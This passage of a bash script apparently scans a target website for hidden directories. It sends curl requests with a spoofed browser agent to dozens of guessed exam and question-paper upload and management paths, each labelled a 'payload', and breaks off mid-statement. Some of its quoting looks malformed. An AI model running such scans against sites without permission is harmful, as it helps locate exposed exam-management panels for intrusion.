echo -n "Payload ["QPBDataHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuiteQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuiteQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
